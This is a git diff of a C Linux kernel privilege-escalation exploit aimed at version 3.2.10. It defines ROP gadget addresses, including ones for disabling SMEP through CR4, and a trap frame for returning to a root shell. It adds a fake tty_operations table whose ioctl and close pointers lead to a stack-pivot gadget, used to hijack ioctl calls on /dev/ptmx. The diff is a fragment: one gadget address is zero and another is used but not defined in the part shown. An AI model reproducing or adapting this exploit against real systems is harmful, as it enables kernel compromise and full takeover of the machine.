@@ -8,6 +8,7 @@
 #include<sys/mman.h>
 #include<sys/ioctl.h>
 #include<errno.h>
+#include<string.h>
 
 //auth0r: afang
 
@@ -20,8 +21,8 @@
 //define target mmap address
 #define target_mmap_addr         (size_t)0x00000000ffff2500
 
-//define gadgets
-
+//define useful gadgets
+//linux version 3.2.10
 #define iretq_addr   	         (size_t)0xffffffff8158a056 //iretq for x64
 #define xchgeax_addr 	         (size_t)0 //xchg eax,esp;ret 
 #define poprdi_addr  	         (size_t)0xffffffff811bfdbd //pop rdi;ret 
@@ -31,7 +32,6 @@
 #define swapgs_addr              (size_t)0xffffffff8158a38b //swapgs
 #define poprax_addr              (size_t)0xffffffff8139c225 //pop rax ; ret
 #define movcr4_poprbp_addr       (size_t)0xffffffff8100a928 //mov cr4, rax ; pop rbp ; ret
-
 
 //define facilities
 #define KERNCALL __attribute__((regparm(3)))
@@ -43,6 +43,8 @@ void interactive(){
 	execl("/bin/sh", "sh", NULL);
 }
 
+//define critical structures
+
 struct trap_frame{
 	void *rip;
 	uint64_t cs;
@@ -52,6 +54,65 @@ struct trap_frame{
 };
 
 struct trap_frame tf;
+
+//linux-3.2.10
+struct tty_operations {
+	struct tty_struct * (*lookup)(struct tty_driver *driver,
+			struct inode *inode, int idx);
+	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
+	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+	int  (*open)(struct tty_struct * tty, struct file * filp);
+	void (*close)(struct tty_struct * tty, struct file * filp);
+	void (*shutdown)(struct tty_struct *tty);
+	void (*cleanup)(struct tty_struct *tty);
+	int  (*write)(struct tty_struct * tty,
+		      const unsigned char *buf, int count);
+	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
+	void (*flush_chars)(struct tty_struct *tty);
+	int  (*write_room)(struct tty_struct *tty);
+	int  (*chars_in_buffer)(struct tty_struct *tty);
+	int  (*ioctl)(struct tty_struct *tty,
+		    unsigned int cmd, unsigned long arg);
+	long (*compat_ioctl)(struct tty_struct *tty,
+			     unsigned int cmd, unsigned long arg);
+	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
+	void (*throttle)(struct tty_struct * tty);
+	void (*unthrottle)(struct tty_struct * tty);
+	void (*stop)(struct tty_struct *tty);
+	void (*start)(struct tty_struct *tty);
+	void (*hangup)(struct tty_struct *tty);
+	int (*break_ctl)(struct tty_struct *tty, int state);
+	void (*flush_buffer)(struct tty_struct *tty);
+	void (*set_ldisc)(struct tty_struct *tty);
+	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
+	void (*send_xchar)(struct tty_struct *tty, char ch);
+	int (*tiocmget)(struct tty_struct *tty);
+	int (*tiocmset)(struct tty_struct *tty,
+			unsigned int set, unsigned int clear);
+	int (*resize)(struct tty_struct *tty, struct winsize *ws);
+	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
+	int (*get_icount)(struct tty_struct *tty,
+				struct serial_icounter_struct *icount);
+//#ifdef CONFIG_CONSOLE_POLL
+//	int (*poll_init)(struct tty_driver *driver, int line, char *options);
+//	int (*poll_get_char)(struct tty_driver *driver, int line);
+//	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
+//#endif
+	const struct file_operations *proc_fops;
+};
+
+void prepare_fake_tty_operations(size_t *ptr){
+
+	//this func intends for faking tty_struct + 0x18 to fake_tty_operations..
+	
+	//create fake tty_operations to hijack ioctl(fd(/dev/ptmx),0,0)		
+	struct tty_operations *fake_ttyop = (struct tty_operations *)malloc(sizeof(struct tty_operations));
+	//memset it to zeros.
+	memset(fake_ttyop , 0, sizeof(struct tty_operations));
+	fake_ttyop->ioctl = (size_t) xchgebp_addr;
+	fake_ttyop->close = (size_t) xchgebp_addr;
+	*ptr = (size_t)fake_ttyop;	
+}
 
 void prepare_tf(){
 
